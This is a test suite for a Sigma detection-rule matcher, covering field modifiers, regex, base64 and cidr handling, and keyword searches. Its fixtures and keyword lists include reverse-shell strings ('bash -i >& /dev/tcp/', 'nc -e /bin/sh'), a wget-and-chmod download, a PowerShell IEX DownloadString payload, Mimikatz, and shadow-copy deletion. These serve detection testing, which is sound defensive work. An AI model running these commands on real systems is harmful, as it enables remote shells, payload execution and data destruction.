import { describe, expect, it } from 'vitest';
import { UnsupportedRuleError } from '../../src/detection/errors.js';
import { compileDetection } from '../../src/detection/sigma/compile.js';
import { encodeBase64Offsets } from '../../src/detection/sigma/encoding.js';
import { fieldMatches, matches } from './helpers.js';

const cmd = (CommandLine: string) => ({ fields: { CommandLine } });

function reasonOf(key: string, value: unknown): string {
  try {
    compileDetection({ selection: { [key]: value }, condition: 'selection' });
  } catch (error) {
    if (error instanceof UnsupportedRuleError) return error.code;
    throw error;
  }
  return 'supported';
}

describe('plain values', () => {
  it('compare case-insensitively by default', () => {
    expect(
      fieldMatches('Image', 'C:\\Windows\\System32\\CMD.EXE', {
        fields: { Image: 'c:\\windows\\system32\\cmd.exe' },
      }),
    ).toBe(true);
  });

  it('honor wildcards inside the value (a backslash before * needs doubling, as in SigmaHQ)', () => {
    // YAML 'C:\\Users\\*\\AppData\\*.exe' (rundll32_udl_exec.yml writes paths this way).
    const rule = 'C:\\\\Users\\\\*\\\\AppData\\\\*.exe';
    expect(
      fieldMatches('Image', rule, { fields: { Image: 'C:\\Users\\ana\\AppData\\x.exe' } }),
    ).toBe(true);
    expect(fieldMatches('Image', rule, { fields: { Image: 'C:\\Users\\ana\\x.exe' } })).toBe(false);
    // A single backslash before * escapes it: 'C:\Users\*' is the literal text 'C:\Users*'.
    expect(fieldMatches('Image', 'C:\\Users\\*', { fields: { Image: 'C:\\Users*' } })).toBe(true);
    expect(fieldMatches('Image', 'C:\\Users\\*', { fields: { Image: 'C:\\Users\\ana' } })).toBe(
      false,
    );
  });

  it('read an escaped wildcard as a literal character', () => {
    expect(fieldMatches('CommandLine', 'a\\*b', cmd('a*b'))).toBe(true);
    expect(fieldMatches('CommandLine', 'a\\*b', cmd('axxb'))).toBe(false);
  });

  it('OR the values of a list', () => {
    expect(fieldMatches('User', ['root', 'admin'], { fields: { User: 'ADMIN' } })).toBe(true);
    expect(fieldMatches('User', ['root', 'admin'], { fields: { User: 'guest' } })).toBe(false);
  });

  it('compare numbers by their decimal string form', () => {
    expect(fieldMatches('sc-status', 404, { fields: { 'sc-status': 404 } })).toBe(true);
    expect(fieldMatches('sc-status', 404, { fields: { 'sc-status': '404' } })).toBe(true);
    expect(fieldMatches('sc-status', 404, { fields: { 'sc-status': 4040 } })).toBe(false);
  });

  it('compare booleans by their string form', () => {
    expect(fieldMatches('ssh.invalid_user', true, { fields: { 'ssh.invalid_user': true } })).toBe(
      true,
    );
    expect(fieldMatches('ssh.invalid_user', true, { fields: { 'ssh.invalid_user': false } })).toBe(
      false,
    );
  });

  it('never match a missing field with a non-null value', () => {
    expect(fieldMatches('CommandLine|contains', 'x', { fields: {} })).toBe(false);
    expect(fieldMatches('CommandLine', '*', { fields: {} })).toBe(false);
  });

  it('null matches an absent, null or empty field', () => {
    expect(fieldMatches('ParentUser', null, { fields: {} })).toBe(true);
    expect(fieldMatches('ParentUser', null, { fields: { ParentUser: null } })).toBe(true);
    expect(fieldMatches('ParentUser', null, { fields: { ParentUser: '' } })).toBe(true);
    expect(fieldMatches('ParentUser', null, { fields: { ParentUser: 'x' } })).toBe(false);
  });

  it("'' matches only the empty string", () => {
    expect(fieldMatches('ParentUser', '', { fields: { ParentUser: '' } })).toBe(true);
    expect(fieldMatches('ParentUser', '', { fields: {} })).toBe(false);
    expect(fieldMatches('ParentUser', '', { fields: { ParentUser: null } })).toBe(false);
  });

  it('mix null with other values in a list', () => {
    expect(fieldMatches('LogonId', ['0x3e7', null], { fields: {} })).toBe(true);
    expect(fieldMatches('LogonId', ['0x3e7', null], { fields: { LogonId: '0x3E7' } })).toBe(true);
    expect(fieldMatches('LogonId', ['0x3e7', null], { fields: { LogonId: '0x1' } })).toBe(false);
  });

  it('look only at the first 8,192 characters of a value', () => {
    const value = `${'a'.repeat(9000)}needle`;
    expect(fieldMatches('CommandLine|contains', 'needle', cmd(value))).toBe(false);
    expect(fieldMatches('CommandLine|contains', 'needle', cmd(`needle${value}`))).toBe(true);
  });
});

describe('contains, startswith, endswith, all', () => {
  it('contains wraps the value in wildcards', () => {
    expect(
      fieldMatches(
        'CommandLine|contains',
        'Invoke-Mimikatz',
        cmd('powershell IEX invoke-mimikatz -x'),
      ),
    ).toBe(true);
    expect(fieldMatches('CommandLine|contains', 'Invoke-Mimikatz', cmd('powershell'))).toBe(false);
  });

  it('startswith and endswith anchor one side', () => {
    expect(
      fieldMatches('ParentImage|startswith', 'C:\\Program Files\\', {
        fields: { ParentImage: 'C:\\Program Files\\x.exe' },
      }),
    ).toBe(true);
    expect(
      fieldMatches('ParentImage|startswith', 'C:\\Program Files\\', {
        fields: { ParentImage: 'D:\\C:\\Program Files\\x.exe' },
      }),
    ).toBe(false);
    expect(
      fieldMatches('Image|endswith', '\\rundll32.exe', {
        fields: { Image: 'C:\\Windows\\System32\\RUNDLL32.EXE' },
      }),
    ).toBe(true);
    expect(
      fieldMatches('Image|endswith', '\\rundll32.exe', {
        fields: { Image: 'C:\\rundll32.exe.bak' },
      }),
    ).toBe(false);
  });

  it('contains keeps wildcards that are already there', () => {
    expect(
      fieldMatches('CommandLine|contains', '*vssadmin*delete*', cmd('vssadmin.exe delete shadows')),
    ).toBe(true);
  });

  it('all requires every value', () => {
    const key = 'CommandLine|contains|all';
    expect(fieldMatches(key, ['-path', 'dll'], cmd('register-cimprovider -path x.dll'))).toBe(true);
    expect(fieldMatches(key, ['-path', 'dll'], cmd('register-cimprovider -path x.exe'))).toBe(
      false,
    );
  });

  it('cased compares case-sensitively', () => {
    expect(fieldMatches('CommandLine|contains|cased', 'IEX', cmd('powershell IEX x'))).toBe(true);
    expect(fieldMatches('CommandLine|contains|cased', 'IEX', cmd('powershell iex x'))).toBe(false);
  });
});

describe('windash', () => {
  it('matches -, /, en dash, em dash and horizontal bar', () => {
    for (const variant of ['-', '/', '\u2013', '\u2014', '\u2015']) {
      expect(
        fieldMatches(
          'CommandLine|contains|windash',
          ' -enc ',
          cmd(`powershell ${variant}enc AAAA`),
        ),
        variant,
      ).toBe(true);
    }
    expect(
      fieldMatches('CommandLine|contains|windash', ' -enc ', cmd('powershell +enc AAAA')),
    ).toBe(false);
  });

  it('varies each option position independently', () => {
    expect(fieldMatches('CommandLine|contains|windash', ' -s -i ', cmd('psexec /s -i cmd'))).toBe(
      true,
    );
    expect(fieldMatches('CommandLine|contains|windash', ' -s -i ', cmd('psexec -s /i cmd'))).toBe(
      true,
    );
  });

  it('does not touch dashes inside words', () => {
    expect(
      fieldMatches('CommandLine|contains|windash', 'Add-MpPreference', cmd('Add/MpPreference')),
    ).toBe(false);
  });

  it('works in either order with contains', () => {
    expect(
      fieldMatches('CommandLine|windash|contains', ' -enc ', cmd('powershell /enc AAAA')),
    ).toBe(true);
  });
});

describe('re', () => {
  it('is unanchored and case-sensitive', () => {
    expect(
      fieldMatches('CommandLine|re', 'ipconfig\\s+/all', cmd('cmd /c ipconfig   /all > x')),
    ).toBe(true);
    expect(fieldMatches('CommandLine|re', 'ipconfig\\s+/all', cmd('cmd /c IPCONFIG /all'))).toBe(
      false,
    );
  });

  it('i ignores case', () => {
    expect(fieldMatches('CommandLine|re|i', 'ipconfig\\s+/all', cmd('IPCONFIG /ALL'))).toBe(true);
  });

  it('accepts the (?i) inline flag', () => {
    expect(
      fieldMatches('CommandLine|re', '(?i)\\s(-u|--user)\\s*:', cmd('curl --USER : http://x')),
    ).toBe(true);
  });

  it('m makes ^ and $ match at line breaks', () => {
    expect(fieldMatches('CommandLine|re', '^second$', cmd('first\nsecond\nthird'))).toBe(false);
    expect(fieldMatches('CommandLine|re|m', '^second$', cmd('first\nsecond\nthird'))).toBe(true);
  });

  it('s makes . match line breaks', () => {
    expect(fieldMatches('CommandLine|re', 'a.b', cmd('a\nb'))).toBe(false);
    expect(fieldMatches('CommandLine|re|s', 'a.b', cmd('a\nb'))).toBe(true);
  });

  it('ORs a list of patterns and ANDs them with all', () => {
    expect(
      fieldMatches('CommandLine|re', ['arp\\s+-a', 'route\\s+print'], cmd('route print')),
    ).toBe(true);
    expect(fieldMatches('CommandLine|re|all', ['arp', 'route'], cmd('route print'))).toBe(false);
  });

  it('runs in linear time on a classic ReDoS pattern', () => {
    const started = performance.now();
    expect(fieldMatches('CommandLine|re', '(a+)+$', cmd(`${'a'.repeat(8000)}!`))).toBe(false);
    expect(performance.now() - started).toBeLessThan(500);
  });

  it('rejects patterns RE2 cannot run (backreferences, lookaround)', () => {
    expect(reasonOf('CommandLine|re', '(a)\\1')).toBe('regex:not-re2');
    expect(reasonOf('CommandLine|re', 'a(?=b)')).toBe('regex:not-re2');
    expect(reasonOf('CommandLine|re', '(?<!x)a')).toBe('regex:not-re2');
  });
});

describe('base64 and base64offset', () => {
  it('base64 matches the standard encoding, case-sensitively', () => {
    expect(fieldMatches('CommandLine|base64', 'foobar', cmd('Zm9vYmFy'))).toBe(true);
    expect(fieldMatches('CommandLine|base64|contains', 'foobar', cmd('x Zm9vYmFy y'))).toBe(true);
    expect(fieldMatches('CommandLine|base64|contains', 'foobar', cmd('x zm9vymfy y'))).toBe(false);
  });

  it('base64offset produces pySigma’s three variants', () => {
    expect(encodeBase64Offsets({ text: 'foobar', binary: false })).toEqual([
      'Zm9vYmFy',
      'Zvb2Jhc',
      'mb29iYX',
    ]);
  });

  it('base64offset|contains finds the value at every alignment', () => {
    for (const prefix of ['', 'x', 'xy', 'xyz']) {
      const encoded = Buffer.from(`${prefix}::FromBase64String(`).toString('base64');
      expect(
        fieldMatches(
          'CommandLine|base64offset|contains',
          '::FromBase64String',
          cmd(`powershell -e ${encoded}`),
        ),
        prefix,
      ).toBe(true);
    }
    expect(
      fieldMatches(
        'CommandLine|base64offset|contains',
        '::FromBase64String',
        cmd('powershell -e AAAA'),
      ),
    ).toBe(false);
  });

  it('wide (utf16le) encodes before base64, as for PowerShell -EncodedCommand', () => {
    const payload = Buffer.from(
      'IEX (New-Object Net.WebClient).DownloadString(x)',
      'utf16le',
    ).toString('base64');
    expect(
      fieldMatches(
        'CommandLine|wide|base64offset|contains',
        'New-Object',
        cmd(`powershell -enc ${payload}`),
      ),
    ).toBe(true);
    expect(
      fieldMatches(
        'CommandLine|utf16le|base64offset|contains',
        'New-Object',
        cmd(`powershell -enc ${payload}`),
      ),
    ).toBe(true);
    expect(
      fieldMatches(
        'CommandLine|base64offset|contains',
        'New-Object',
        cmd(`powershell -enc ${payload}`),
      ),
    ).toBe(false);
  });

  it('utf16be and utf16 (with byte order mark) encode as specified', () => {
    const be = Buffer.from('ab'.split('').flatMap((c) => [0, c.charCodeAt(0)])).toString('base64');
    expect(fieldMatches('CommandLine|utf16be|base64', 'ab', cmd(be))).toBe(true);
    const bom = Buffer.concat([Buffer.from([0xff, 0xfe]), Buffer.from('ab', 'utf16le')]).toString(
      'base64',
    );
    expect(fieldMatches('CommandLine|utf16|base64', 'ab', cmd(bom))).toBe(true);
  });

  it('refuses to encode values with wildcards', () => {
    expect(reasonOf('CommandLine|base64', 'foo*')).toBe('modifier:wildcard-encoding');
    expect(reasonOf('CommandLine|contains|base64', 'foo')).toBe('modifier:wildcard-encoding');
  });
});

describe('cidr', () => {
  it('matches IPv4 addresses inside the network', () => {
    expect(
      fieldMatches('source.ip|cidr', '10.20.0.0/16', { fields: { 'source.ip': '10.20.1.5' } }),
    ).toBe(true);
    expect(
      fieldMatches('source.ip|cidr', '10.20.0.0/16', { fields: { 'source.ip': '10.21.0.1' } }),
    ).toBe(false);
  });

  it('matches IPv6 networks and IPv4-mapped addresses', () => {
    expect(
      fieldMatches('source.ip|cidr', '2001:db8::/32', { fields: { 'source.ip': '2001:db8::1' } }),
    ).toBe(true);
    expect(
      fieldMatches('source.ip|cidr', '2001:db8::/32', { fields: { 'source.ip': '2001:db9::1' } }),
    ).toBe(false);
    expect(
      fieldMatches('source.ip|cidr', '10.0.0.0/8', { fields: { 'source.ip': '::ffff:10.1.2.3' } }),
    ).toBe(true);
    expect(
      fieldMatches('source.ip|cidr', '10.0.0.0/8', { fields: { 'source.ip': '2001:db8::1' } }),
    ).toBe(false);
  });

  it('never matches a value that is not an address', () => {
    expect(
      fieldMatches('source.ip|cidr', '10.0.0.0/8', { fields: { 'source.ip': 'gateway.example' } }),
    ).toBe(false);
    expect(
      fieldMatches('source.ip|cidr', '10.0.0.0/8', { fields: { 'source.ip': '0x0a.1' } }),
    ).toBe(false);
  });

  it('rejects an invalid network in the rule', () => {
    expect(reasonOf('source.ip|cidr', '10.0.0.0/33')).toBe('modifier:cidr-value');
  });
});

describe('exists', () => {
  it('true: present and not null; false: absent or null', () => {
    expect(fieldMatches('Hashes|exists', true, { fields: { Hashes: 'MD5=1' } })).toBe(true);
    expect(fieldMatches('Hashes|exists', true, { fields: { Hashes: null } })).toBe(false);
    expect(fieldMatches('Hashes|exists', false, { fields: {} })).toBe(true);
    expect(fieldMatches('Hashes|exists', false, { fields: { Hashes: 'MD5=1' } })).toBe(false);
  });

  it('requires a boolean', () => {
    expect(reasonOf('Hashes|exists', 'yes')).toBe('modifier:exists-value');
  });
});

describe('numeric comparisons', () => {
  const at = (value: number | string) => ({ fields: { count: value } });

  it('lt, lte, gt and gte at their boundaries', () => {
    expect(fieldMatches('count|lt', 10, at(9))).toBe(true);
    expect(fieldMatches('count|lt', 10, at(10))).toBe(false);
    expect(fieldMatches('count|lte', 10, at(10))).toBe(true);
    expect(fieldMatches('count|gt', 10, at(10))).toBe(false);
    expect(fieldMatches('count|gt', 10, at(11))).toBe(true);
    expect(fieldMatches('count|gte', 10, at(10))).toBe(true);
    expect(fieldMatches('count|gte', 10, at(9))).toBe(false);
  });

  it('read numeric strings and never match other values', () => {
    expect(fieldMatches('count|gte', 10, at('42'))).toBe(true);
    expect(fieldMatches('count|gte', 10, at('forty-two'))).toBe(false);
    expect(fieldMatches('count|gte', 10, { fields: {} })).toBe(false);
  });

  it('require a number in the rule', () => {
    expect(reasonOf('count|gt', 'ten')).toBe('modifier:numeric-value');
  });
});

describe('fieldref', () => {
  it('compares with another field, ignoring case', () => {
    expect(
      fieldMatches('User|fieldref', 'ParentUser', {
        fields: { User: 'ANDES\\Ana', ParentUser: 'andes\\ana' },
      }),
    ).toBe(true);
    expect(
      fieldMatches('User|fieldref', 'ParentUser', {
        fields: { User: 'ANDES\\ana', ParentUser: 'ANDES\\bob' },
      }),
    ).toBe(false);
  });

  it('never matches when either field is missing', () => {
    expect(fieldMatches('User|fieldref', 'ParentUser', { fields: { User: 'x' } })).toBe(false);
    expect(fieldMatches('User|fieldref', 'ParentUser', { fields: { ParentUser: 'x' } })).toBe(
      false,
    );
  });
});

describe('unsupported modifiers', () => {
  it('expand', () => {
    expect(reasonOf('CommandLine|expand', '%placeholder%')).toBe('modifier:expand');
  });

  it('unknown names, including regex flags without re', () => {
    expect(reasonOf('CommandLine|contains|frobnicate', 'x')).toBe('modifier:unknown');
    expect(reasonOf('CommandLine|i', 'x')).toBe('modifier:unknown');
  });

  it('type modifiers after a transform, and transforms after a type modifier', () => {
    expect(reasonOf('CommandLine|contains|re', 'x')).toBe('modifier:incompatible');
    expect(reasonOf('CommandLine|re|contains', 'x')).toBe('modifier:incompatible');
    expect(reasonOf('source.ip|cidr|cased', '10.0.0.0/8')).toBe('modifier:incompatible');
  });
});

describe('keywords', () => {
  it('search the message for any value, case-insensitively', () => {
    const detection = {
      keywords: ['bash -i >& /dev/tcp/', 'nc -e /bin/sh '],
      condition: 'keywords',
    };
    expect(
      matches(detection, {
        message: 'COMMAND=/usr/bin/bash -c BASH -I >& /dev/tcp/203.0.113.77/4444',
      }),
    ).toBe(true);
    expect(matches(detection, { message: 'COMMAND=/usr/bin/systemctl restart nginx' })).toBe(false);
  });

  it('honor wildcards inside a keyword', () => {
    const detection = { keywords: ['wget * chmod'], condition: 'keywords' };
    expect(matches(detection, { message: 'cd /tmp; wget http://x/y; chmod +x y' })).toBe(true);
  });

  it("'|all' requires every keyword", () => {
    const detection = {
      keywords: { '|all': ['bash -c /bin/bash', '&/dev/tcp/'] },
      condition: 'keywords',
    };
    expect(matches(detection, { message: 'bash -c /bin/bash -i >&/dev/tcp/1.2.3.4/80' })).toBe(
      true,
    );
    expect(matches(detection, { message: 'bash -c /bin/bash -i' })).toBe(false);
  });

  it('accept a single keyword and numbers', () => {
    expect(
      matches(
        { keywords: 'GID=27,', condition: 'keywords' },
        { message: 'new user: name=x, UID=1001, GID=27, home=/h' },
      ),
    ).toBe(true);
    expect(
      matches({ keywords: [4444], condition: 'keywords' }, { message: 'connect to 4444' }),
    ).toBe(true);
  });
});
